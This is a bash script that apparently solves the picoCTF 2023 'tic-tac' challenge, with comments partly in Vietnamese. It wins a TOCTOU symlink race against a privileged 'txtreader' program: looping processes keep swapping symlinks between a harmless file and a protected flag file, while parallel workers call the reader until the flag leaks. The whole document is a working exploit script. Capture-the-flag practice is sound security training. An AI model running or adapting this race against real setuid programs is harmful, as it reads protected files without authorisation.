#!/bin/bash
# txtreader TOCTOU symlink race (CyLab 380 tic-tac, picoCTF 2023)
# Chay tren box SSH: /tmp/race.sh (hoac copy vao home, chmod +x)
mkdir -p /tmp/race && cd /tmp/race
echo "LEGIT" > legit
FLAG=/home/ctf-player/flag.txt
rm -f result.txt done
TXT=/home/ctf-player/txtreader
for L in 1 2 3 4; do
  ( while :; do ln -sf /tmp/race/legit "link$L"; ln -sf "$FLAG" "link$L"; done ) &
done
sleep 0.2
for L in 1 2 3 4; do
  ( for i in $(seq 1 400000); do
      OUT=$($TXT "/tmp/race/link$L" 2>/dev/null)
      if echo "$OUT" | grep -qE "academy\{|picoCTF\{|CTF\{"; then
        echo "WORKER$L HIT: $OUT" >> /tmp/race/result.txt
        touch /tmp/race/done
        break
      fi
      [ -f /tmp/race/done ] && break
    done ) &
done
wait
cat /tmp/race/result.txt